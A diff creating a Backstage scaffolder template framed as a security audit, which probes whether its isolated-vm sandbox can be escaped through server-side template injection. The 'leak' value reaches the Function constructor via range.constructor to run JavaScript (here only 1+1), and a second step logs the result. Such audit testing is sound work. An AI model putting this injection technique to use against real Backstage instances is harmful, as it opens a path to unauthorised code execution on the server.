@@ -1,7 +1,32 @@
-- id: fetch
+apiVersion: scaffolder.backstage.io/v1beta3
+kind: Template
+metadata:
+  name: ssti-sandbox-escape-test
+  title: "Security Audit: Sandbox Escape"
+  description: "Testing if the isolated-vm sandbox can be bypassed."
+spec:
+  type: service
+  owner: security-audit
+  
+  parameters:
+    - title: Audit Details
+      properties:
+        name:
+          type: string
+          title: Audit Name
+          default: "Sandbox_Test_01"
+
+  # EVERY step must be indented under 'steps:'
+  steps:
+    - id: fetch
       action: fetch:template
       input:
         url: ./skeleton
         values:
-          # Test if we can run ANY javascript
+          # TEST 2: Simple math to see if the engine is alive
           leak: "{{ range.constructor('return 1+1')() }}"
+
+    - id: log-result
+      action: debug:log
+      input:
+        message: "Audit Result: {{ values.leak }}"
